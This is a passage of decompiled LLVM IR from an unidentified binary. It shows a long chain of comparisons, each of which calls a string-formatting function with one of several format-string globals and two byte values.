  %v3_b154 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b160 = sext i8 %v3_b148 to i32
  %v6_b160 = sext i8 %v3_b154 to i32
  %v8_b160 = call i32 @szprintf(i32 %v2_b13c, i32 ptrtoint ([14 x i8]* @global_var_32864.158 to i32), i32 %v4_b160, i32 %v6_b160, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %dec_label_pc_b130, %dec_label_pc_b13c
  %v7_b168 = icmp eq i32 %v2_a984, 38
  br i1 %v7_b168, label %dec_label_pc_b170, label %dec_label_pc_b198

dec_label_pc_b170:                                ; preds = %dec_label_pc_b164
  %v2_b170 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b17c = load i8, i8* @global_var_42c78.78, align 1
  %v3_b188 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b194 = sext i8 %v3_b17c to i32
  %v6_b194 = sext i8 %v3_b188 to i32
  %v8_b194 = call i32 @szprintf(i32 %v2_b170, i32 ptrtoint ([14 x i8]* @global_var_32874.160 to i32), i32 %v4_b194, i32 %v6_b194, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b164, %dec_label_pc_b170
  %v7_b19c = icmp eq i32 %v2_a984, 39
  br i1 %v7_b19c, label %dec_label_pc_b1a4, label %dec_label_pc_b1cc

dec_label_pc_b1a4:                                ; preds = %dec_label_pc_b198
  %v2_b1a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1b0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b1bc = load i8, i8* @global_var_42c79.79, align 1
  %v4_b1c8 = sext i8 %v3_b1b0 to i32
  %v6_b1c8 = sext i8 %v3_b1bc to i32
  %v8_b1c8 = call i32 @szprintf(i32 %v2_b1a4, i32 ptrtoint ([14 x i8]* @global_var_32884.162 to i32), i32 %v4_b1c8, i32 %v6_b1c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1cc

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_b198, %dec_label_pc_b1a4
  %v7_b1d0 = icmp eq i32 %v2_a984, 40
  br i1 %v7_b1d0, label %dec_label_pc_b1d8, label %dec_label_pc_b200

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_b1cc
  %v2_b1d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1e4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b1f0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b1fc = sext i8 %v3_b1e4 to i32
  %v6_b1fc = sext i8 %v3_b1f0 to i32
  %v8_b1fc = call i32 @szprintf(i32 %v2_b1d8, i32 ptrtoint ([14 x i8]* @global_var_32894.164 to i32), i32 %v4_b1fc, i32 %v6_b1fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b200

dec_label_pc_b200:                                ; preds = %dec_label_pc_b1cc, %dec_label_pc_b1d8
  %v7_b204 = icmp eq i32 %v2_a984, 41
  br i1 %v7_b204, label %dec_label_pc_b20c, label %dec_label_pc_b234

dec_label_pc_b20c:                                ; preds = %dec_label_pc_b200
  %v2_b20c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b218 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b224 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b230 = sext i8 %v3_b218 to i32
  %v6_b230 = sext i8 %v3_b224 to i32
  %v8_b230 = call i32 @szprintf(i32 %v2_b20c, i32 ptrtoint ([14 x i8]* @global_var_328a4.166 to i32), i32 %v4_b230, i32 %v6_b230, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b234

dec_label_pc_b234:                                ; preds = %dec_label_pc_b200, %dec_label_pc_b20c
  %v7_b238 = icmp eq i32 %v2_a984, 42
  br i1 %v7_b238, label %dec_label_pc_b240, label %dec_label_pc_b268

dec_label_pc_b240:                                ; preds = %dec_label_pc_b234
  %v2_b240 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b24c = load i8, i8* @global_var_42c78.78, align 1
  %v3_b258 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b264 = sext i8 %v3_b24c to i32
  %v6_b264 = sext i8 %v3_b258 to i32
  %v8_b264 = call i32 @szprintf(i32 %v2_b240, i32 ptrtoint ([14 x i8]* @global_var_328b4.168 to i32), i32 %v4_b264, i32 %v6_b264, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b268

dec_label_pc_b268:                                ; preds = %dec_label_pc_b234, %dec_label_pc_b240
  %v7_b26c = icmp eq i32 %v2_a984, 43
  br i1 %v7_b26c, label %dec_label_pc_b274, label %dec_label_pc_b29c

dec_label_pc_b274:                                ; preds = %dec_label_pc_b268
  %v2_b274 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b280 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b28c = load i8, i8* @global_var_42c79.79, align 1
  %v4_b298 = sext i8 %v3_b280 to i32
  %v6_b298 = sext i8 %v3_b28c to i32
  %v8_b298 = call i32 @szprintf(i32 %v2_b274, i32 ptrtoint ([14 x i8]* @global_var_328c4.170 to i32), i32 %v4_b298, i32 %v6_b298, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b29c

dec_label_pc_b29c:                                ; preds = %dec_label_pc_b268, %dec_label_pc_b274
  %v7_b2a0 = icmp eq i32 %v2_a984, 44
  br i1 %v7_b2a0, label %dec_label_pc_b2a8, label %dec_label_pc_b2d0

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b29c
  %v2_b2a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2b4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b2c0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b2cc = sext i8 %v3_b2b4 to i32
  %v6_b2cc = sext i8 %v3_b2c0 to i32
  %v8_b2cc = call i32 @szprintf(i32 %v2_b2a8, i32 ptrtoint ([14 x i8]* @global_var_328d4.172 to i32), i32 %v4_b2cc, i32 %v6_b2cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2d0

dec_label_pc_b2d0:                                ; preds = %dec_label_pc_b29c, %dec_label_pc_b2a8
  %v7_b2d4 = icmp eq i32 %v2_a984, 45
  br i1 %v7_b2d4, label %dec_label_pc_b2dc, label %dec_label_pc_b304

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2d0
  %v2_b2dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2e8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b2f4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b300 = sext i8 %v3_b2e8 to i32
  %v6_b300 = sext i8 %v3_b2f4 to i32
  %v8_b300 = call i32 @szprintf(i32 %v2_b2dc, i32 ptrtoint ([14 x i8]* @global_var_328e4.174 to i32), i32 %v4_b300, i32 %v6_b300, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b304

dec_label_pc_b304:                                ; preds = %dec_label_pc_b2d0, %dec_label_pc_b2dc
  %v7_b308 = icmp eq i32 %v2_a984, 46
  br i1 %v7_b308, label %dec_label_pc_b310, label %dec_label_pc_b338

dec_label_pc_b310:                                ; preds = %dec_label_pc_b304
  %v2_b310 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b31c = load i8, i8* @global_var_42c78.78, align 1
  %v3_b328 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b334 = sext i8 %v3_b31c to i32
  %v6_b334 = sext i8 %v3_b328 to i32
  %v8_b334 = call i32 @szprintf(i32 %v2_b310, i32 ptrtoint ([14 x i8]* @global_var_328f4.176 to i32), i32 %v4_b334, i32 %v6_b334, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b338

dec_label_pc_b338:                                ; preds = %dec_label_pc_b304, %dec_label_pc_b310
  %v7_b33c = icmp eq i32 %v2_a984, 47
  br i1 %v7_b33c, label %dec_label_pc_b344, label %dec_label_pc_b36c

dec_label_pc_b344:                                ; preds = %dec_label_pc_b338
  %v2_b344 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b350 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b35c = load i8, i8* @global_var_42c79.79, align 1
  %v4_b368 = sext i8 %v3_b350 to i32
  %v6_b368 = sext i8 %v3_b35c to i32
  %v8_b368 = call i32 @szprintf(i32 %v2_b344, i32 ptrtoint ([14 x i8]* @global_var_32904.178 to i32), i32 %v4_b368, i32 %v6_b368, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b36c

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b338, %dec_label_pc_b344
  %v7_b370 = icmp eq i32 %v2_a984, 48
  br i1 %v7_b370, label %dec_label_pc_b378, label %dec_label_pc_b3a0

dec_label_pc_b378:                                ; preds = %dec_label_pc_b36c
  %v2_b378 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b384 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b390 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b39c = sext i8 %v3_b384 to i32
  %v6_b39c = sext i8 %v3_b390 to i32
  %v8_b39c = call i32 @szprintf(i32 %v2_b378, i32 ptrtoint ([14 x i8]* @global_var_32914.180 to i32), i32 %v4_b39c, i32 %v6_b39c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3a0

dec_label_pc_b3a0:                                ; preds = %dec_label_pc_b36c, %dec_label_pc_b378
  %v7_b3a4 = icmp eq i32 %v2_a984, 49
  br i1 %v7_b3a4, label %dec_label_pc_b3ac, label %dec_label_pc_b3d4

dec_label_pc_b3ac:                                ; preds = %dec_label_pc_b3a0
  %v2_b3ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3b8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b3c4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b3d0 = sext i8 %v3_b3b8 to i32
  %v6_b3d0 = sext i8 %v3_b3c4 to i32
  %v8_b3d0 = call i32 @szprintf(i32 %v2_b3ac, i32 ptrtoint ([13 x i8]* @global_var_32924.182 to i32), i32 %v4_b3d0, i32 %v6_b3d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3d4

dec_label_pc_b3d4:                                ; preds = %dec_label_pc_b3a0, %dec_label_pc_b3ac
  %v7_b3d8 = icmp eq i32 %v2_a984, 50
  br i1 %v7_b3d8, label %dec_label_pc_b3e0, label %dec_label_pc_b408

dec_label_pc_b3e0:                                ; preds = %dec_label_pc_b3d4
  %v2_b3e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3ec = load i8, i8* @global_var_42c78.78, align 1
  %v3_b3f8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b404 = sext i8 %v3_b3ec to i32
  %v6_b404 = sext i8 %v3_b3f8 to i32
  %v8_b404 = call i32 @szprintf(i32 %v2_b3e0, i32 ptrtoint ([13 x i8]* @global_var_32934.184 to i32), i32 %v4_b404, i32 %v6_b404, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b408

dec_label_pc_b408:                                ; preds = %dec_label_pc_b3d4, %dec_label_pc_b3e0
  %v7_b40c = icmp eq i32 %v2_a984, 51
  br i1 %v7_b40c, label %dec_label_pc_b414, label %dec_label_pc_b43c

dec_label_pc_b414:                                ; preds = %dec_label_pc_b408
  %v2_b414 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b420 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b42c = load i8, i8* @global_var_42c79.79, align 1
  %v4_b438 = sext i8 %v3_b420 to i32
  %v6_b438 = sext i8 %v3_b42c to i32
  %v8_b438 = call i32 @szprintf(i32 %v2_b414, i32 ptrtoint ([14 x i8]* @global_var_32944.186 to i32), i32 %v4_b438, i32 %v6_b438, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b43c

dec_label_pc_b43c:                                ; preds = %dec_label_pc_b408, %dec_label_pc_b414
  %v7_b440 = icmp eq i32 %v2_a984, 52
  br i1 %v7_b440, label %dec_label_pc_b448, label %dec_label_pc_b470

dec_label_pc_b448:                                ; preds = %dec_label_pc_b43c
  %v2_b448 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b454 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b460 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b46c = sext i8 %v3_b454 to i32
  %v6_b46c = sext i8 %v3_b460 to i32
  %v8_b46c = call i32 @szprintf(i32 %v2_b448, i32 ptrtoint ([14 x i8]* @global_var_32954.188 to i32), i32 %v4_b46c, i32 %v6_b46c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b470

dec_label_pc_b470:                                ; preds = %dec_label_pc_b43c, %dec_label_pc_b448
  %v7_b474 = icmp eq i32 %v2_a984, 53
  br i1 %v7_b474, label %dec_label_pc_b47c, label %dec_label_pc_b4a4

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b470
  %v2_b47c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b488 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b494 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b4a0 = sext i8 %v3_b488 to i32
  %v6_b4a0 = sext i8 %v3_b494 to i32
  %v8_b4a0 = call i32 @szprintf(i32 %v2_b47c, i32 ptrtoint ([14 x i8]* @global_var_32964.190 to i32), i32 %v4_b4a0, i32 %v6_b4a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4a4

dec_label_pc_b4a4:                                ; preds = %dec_label_pc_b470, %dec_label_pc_b47c
  %v7_b4a8 = icmp eq i32 %v2_a984, 54
  br i1 %v7_b4a8, label %dec_label_pc_b4b0, label %dec_label_pc_b4d8

dec_label_pc_b4b0:                                ; preds = %dec_label_pc_b4a4
  %v2_b4b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4bc = load i8, i8* @global_var_42c78.78, align 1
  %v3_b4c8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b4d4 = sext i8 %v3_b4bc to i32
  %v6_b4d4 = sext i8 %v3_b4c8 to i32
  %v8_b4d4 = call i32 @szprintf(i32 %v2_b4b0, i32 ptrtoint ([14 x i8]* @global_var_32974.192 to i32), i32 %v4_b4d4, i32 %v6_b4d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4d8

dec_label_pc_b4d8:                                ; preds = %dec_label_pc_b4a4, %dec_label_pc_b4b0
  %v7_b4dc = icmp eq i32 %v2_a984, 55
  br i1 %v7_b4dc, label %dec_label_pc_b4e4, label %dec_label_pc_b50c

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b4d8
  %v2_b4e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4f0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b4fc = load i8, i8* @global_var_42c79.79, align 1
  %v4_b508 = sext i8 %v3_b4f0 to i32
  %v6_b508 = sext i8 %v3_b4fc to i32
  %v8_b508 = call i32 @szprintf(i32 %v2_b4e4, i32 ptrtoint ([13 x i8]* @global_var_32984.194 to i32), i32 %v4_b508, i32 %v6_b508, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b50c

dec_label_pc_b50c:                                ; preds = %dec_label_pc_b4d8, %dec_label_pc_b4e4
  %v7_b510 = icmp eq i32 %v2_a984, 56
  br i1 %v7_b510, label %dec_label_pc_b518, label %dec_label_pc_b540

dec_label_pc_b518:                                ; preds = %dec_label_pc_b50c
  %v2_b518 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b524 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b530 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b53c = sext i8 %v3_b524 to i32
  %v6_b53c = sext i8 %v3_b530 to i32
  %v8_b53c = call i32 @szprintf(i32 %v2_b518, i32 ptrtoint ([13 x i8]* @global_var_32994.196 to i32), i32 %v4_b53c, i32 %v6_b53c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b540

dec_label_pc_b540:                                ; preds = %dec_label_pc_b50c, %dec_label_pc_b518
  %v7_b544 = icmp eq i32 %v2_a984, 57
  br i1 %v7_b544, label %dec_label_pc_b54c, label %dec_label_pc_b574

dec_label_pc_b54c:                                ; preds = %dec_label_pc_b540
  %v2_b54c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b558 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b564 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b570 = sext i8 %v3_b558 to i32
  %v6_b570 = sext i8 %v3_b564 to i32
  %v8_b570 = call i32 @szprintf(i32 %v2_b54c, i32 ptrtoint ([13 x i8]* @global_var_329a4.198 to i32), i32 %v4_b570, i32 %v6_b570, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b574

dec_label_pc_b574:                                ; preds = %dec_label_pc_b540, %dec_label_pc_b54c
  %v7_b578 = icmp eq i32 %v2_a984, 58
  br i1 %v7_b578, label %dec_label_pc_b580, label %dec_label_pc_b5a8

dec_label_pc_b580:                                ; preds = %dec_label_pc_b574
  %v2_b580 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b58c = load i8, i8* @global_var_42c78.78, align 1
  %v3_b598 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b5a4 = sext i8 %v3_b58c to i32
  %v6_b5a4 = sext i8 %v3_b598 to i32
  %v8_b5a4 = call i32 @szprintf(i32 %v2_b580, i32 ptrtoint ([13 x i8]* @global_var_329b4.200 to i32), i32 %v4_b5a4, i32 %v6_b5a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5a8

dec_label_pc_b5a8:                                ; preds = %dec_label_pc_b574, %dec_label_pc_b580
  %v7_b5ac = icmp eq i32 %v2_a984, 59
  br i1 %v7_b5ac, label %dec_label_pc_b5b4, label %dec_label_pc_b5dc

dec_label_pc_b5b4:                                ; preds = %dec_label_pc_b5a8
  %v2_b5b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5c0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b5cc = load i8, i8* @global_var_42c79.79, align 1
  %v4_b5d8 = sext i8 %v3_b5c0 to i32
  %v6_b5d8 = sext i8 %v3_b5cc to i32
  %v8_b5d8 = call i32 @szprintf(i32 %v2_b5b4, i32 ptrtoint ([13 x i8]* @global_var_329c4.202 to i32), i32 %v4_b5d8, i32 %v6_b5d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5a8, %dec_label_pc_b5b4
  %v7_b5e0 = icmp eq i32 %v2_a984, 60
  br i1 %v7_b5e0, label %dec_label_pc_b5e8, label %dec_label_pc_b610

dec_label_pc_b5e8:                                ; preds = %dec_label_pc_b5dc
  %v2_b5e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5f4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b600 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b60c = sext i8 %v3_b5f4 to i32
  %v6_b60c = sext i8 %v3_b600 to i32
  %v8_b60c = call i32 @szprintf(i32 %v2_b5e8, i32 ptrtoint ([12 x i8]* @global_var_329d4.204 to i32), i32 %v4_b60c, i32 %v6_b60c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b610

dec_label_pc_b610:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b5e8
  %v7_b614 = icmp eq i32 %v2_a984, 61
  br i1 %v7_b614, label %dec_label_pc_b61c, label %dec_label_pc_b644

dec_label_pc_b61c:                                ; preds = %dec_label_pc_b610
  %v2_b61c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b628 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b634 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b640 = sext i8 %v3_b628 to i32
  %v6_b640 = sext i8 %v3_b634 to i32
  %v8_b640 = call i32 @szprintf(i32 %v2_b61c, i32 ptrtoint ([13 x i8]* @global_var_329e0.206 to i32), i32 %v4_b640, i32 %v6_b640, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b644

dec_label_pc_b644:                                ; preds = %dec_label_pc_b610, %dec_label_pc_b61c
  %v7_b648 = icmp eq i32 %v2_a984, 62
  br i1 %v7_b648, label %dec_label_pc_b650, label %dec_label_pc_b678

dec_label_pc_b650:                                ; preds = %dec_label_pc_b644
  %v2_b650 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b65c = load i8, i8* @global_var_42c78.78, align 1
  %v3_b668 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b674 = sext i8 %v3_b65c to i32
  %v6_b674 = sext i8 %v3_b668 to i32
  %v8_b674 = call i32 @szprintf(i32 %v2_b650, i32 ptrtoint ([13 x i8]* @global_var_329f0.208 to i32), i32 %v4_b674, i32 %v6_b674, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b678

dec_label_pc_b678:                                ; preds = %dec_label_pc_b644, %dec_label_pc_b650
  %v7_b67c = icmp eq i32 %v2_a984, 63
  br i1 %v7_b67c, label %dec_label_pc_b684, label %dec_label_pc_b6ac

dec_label_pc_b684:                                ; preds = %dec_label_pc_b678
  %v2_b684 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b690 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b69c = load i8, i8* @global_var_42c79.79, align 1
  %v4_b6a8 = sext i8 %v3_b690 to i32
  %v6_b6a8 = sext i8 %v3_b69c to i32
  %v8_b6a8 = call i32 @szprintf(i32 %v2_b684, i32 ptrtoint ([13 x i8]* @global_var_32a00.210 to i32), i32 %v4_b6a8, i32 %v6_b6a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6ac

dec_label_pc_b6ac:                                ; preds = %dec_label_pc_b678, %dec_label_pc_b684
  %v7_b6b0 = icmp eq i32 %v2_a984, 64
  br i1 %v7_b6b0, label %dec_label_pc_b6b8, label %dec_label_pc_b6e0

dec_label_pc_b6b8:                                ; preds = %dec_label_pc_b6ac
  %v2_b6b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6c4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b6d0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b6dc = sext i8 %v3_b6c4 to i32
  %v6_b6dc = sext i8 %v3_b6d0 to i32
  %v8_b6dc = call i32 @szprintf(i32 %v2_b6b8, i32 ptrtoint ([13 x i8]* @global_var_32a10.212 to i32), i32 %v4_b6dc, i32 %v6_b6dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6e0

dec_label_pc_b6e0:                                ; preds = %dec_label_pc_b6ac, %dec_label_pc_b6b8
  %v7_b6e4 = icmp eq i32 %v2_a984, 65
  br i1 %v7_b6e4, label %dec_label_pc_b6ec, label %dec_label_pc_b714

dec_label_pc_b6ec:                                ; preds = %dec_label_pc_b6e0
  %v2_b6ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6f8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b704 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b710 = sext i8 %v3_b6f8 to i32
  %v6_b710 = sext i8 %v3_b704 to i32
  %v8_b710 = call i32 @szprintf(i32 %v2_b6ec, i32 ptrtoint ([13 x i8]* @global_var_32a20.214 to i32), i32 %v4_b710, i32 %v6_b710, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b714

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6e0, %dec_label_pc_b6ec
  %v7_b718 = icmp eq i32 %v2_a984, 66
  br i1 %v7_b718, label %dec_label_pc_b720, label %dec_label_pc_b748

dec_label_pc_b720:                                ; preds = %dec_label_pc_b714
  %v2_b720 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b72c = load i8, i8* @global_var_42c78.78, align 1
  %v3_b738 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b744 = sext i8 %v3_b72c to i32
  %v6_b744 = sext i8 %v3_b738 to i32
  %v8_b744 = call i32 @szprintf(i32 %v2_b720, i32 ptrtoint ([13 x i8]* @global_var_32a30.216 to i32), i32 %v4_b744, i32 %v6_b744, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b748

dec_label_pc_b748:                                ; preds = %dec_label_pc_b714, %dec_label_pc_b720
  %v7_b74c = icmp eq i32 %v2_a984, 67
  br i1 %v7_b74c, label %dec_label_pc_b754, label %dec_label_pc_b77c

dec_label_pc_b754:                                ; preds = %dec_label_pc_b748
  %v2_b754 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b760 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b76c = load i8, i8* @global_var_42c79.79, align 1
  %v4_b778 = sext i8 %v3_b760 to i32
  %v6_b778 = sext i8 %v3_b76c to i32
  %v8_b778 = call i32 @szprintf(i32 %v2_b754, i32 ptrtoint ([13 x i8]* @global_var_32a40.218 to i32), i32 %v4_b778, i32 %v6_b778, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b748, %dec_label_pc_b754
  %v7_b780 = icmp eq i32 %v2_a984, 68
  br i1 %v7_b780, label %dec_label_pc_b788, label %dec_label_pc_b7b0

dec_label_pc_b788:                                ; preds = %dec_label_pc_b77c
  %v2_b788 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b794 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b7a0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b7ac = sext i8 %v3_b794 to i32
  %v6_b7ac = sext i8 %v3_b7a0 to i32
  %v8_b7ac = call i32 @szprintf(i32 %v2_b788, i32 ptrtoint ([13 x i8]* @global_var_32a50.220 to i32), i32 %v4_b7ac, i32 %v6_b7ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7b0

dec_label_pc_b7b0:                                ; preds = %dec_label_pc_b77c, %dec_label_pc_b788
  %v7_b7b4 = icmp eq i32 %v2_a984, 69
  br i1 %v7_b7b4, label %dec_label_pc_b7bc, label %dec_label_pc_ba4c

dec_label_pc_b7bc:                                ; preds = %dec_label_pc_b7b0
  %v2_b7bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7c8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b7d4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b7e0 = sext i8 %v3_b7c8 to i32
  %v6_b7e0 = sext i8 %v3_b7d4 to i32
  %v8_b7e0 = call i32 @szprintf(i32 %v2_b7bc, i32 ptrtoint ([13 x i8]* @global_var_32a60.222 to i32), i32 %v4_b7e0, i32 %v6_b7e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_b7b0, %dec_label_pc_b7bc
  %v7_ba50 = icmp eq i32 %v2_a984, 70
  br i1 %v7_ba50, label %dec_label_pc_ba58, label %dec_label_pc_ba80

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba4c
  %v2_ba58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba64 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ba70 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ba7c = sext i8 %v3_ba64 to i32
  %v6_ba7c = sext i8 %v3_ba70 to i32
  %v8_ba7c = call i32 @szprintf(i32 %v2_ba58, i32 ptrtoint ([12 x i8]* @global_var_32a70.224 to i32), i32 %v4_ba7c, i32 %v6_ba7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba58
  %v7_ba84 = icmp eq i32 %v2_a984, 71
  br i1 %v7_ba84, label %dec_label_pc_ba8c, label %dec_label_pc_bab4

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba80
  %v2_ba8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba98 = load i8, i8* @global_var_42c78.78, align 1
  %v3_baa4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bab0 = sext i8 %v3_ba98 to i32
  %v6_bab0 = sext i8 %v3_baa4 to i32
  %v8_bab0 = call i32 @szprintf(i32 %v2_ba8c, i32 ptrtoint ([13 x i8]* @global_var_32a7c.227 to i32), i32 %v4_bab0, i32 %v6_bab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab4

dec_label_pc_bab4:                                ; preds = %dec_label_pc_ba80, %dec_label_pc_ba8c
  %v7_bab8 = icmp eq i32 %v2_a984, 72
  br i1 %v7_bab8, label %dec_label_pc_bac0, label %dec_label_pc_bae8

dec_label_pc_bac0:                                ; preds = %dec_label_pc_bab4
  %v2_bac0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bacc = load i8, i8* @global_var_42c78.78, align 1
  %v3_bad8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bae4 = sext i8 %v3_bacc to i32
  %v6_bae4 = sext i8 %v3_bad8 to i32
  %v8_bae4 = call i32 @szprintf(i32 %v2_bac0, i32 ptrtoint ([13 x i8]* @global_var_32a8c.229 to i32), i32 %v4_bae4, i32 %v6_bae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %dec_label_pc_bab4, %dec_label_pc_bac0
  %v7_baec = icmp eq i32 %v2_a984, 73
  br i1 %v7_baec, label %dec_label_pc_baf4, label %dec_label_pc_bb1c

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bae8
  %v2_baf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb00 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bb0c = load i8, i8* @global_var_42c79.79, align 1
  %v4_bb18 = sext i8 %v3_bb00 to i32
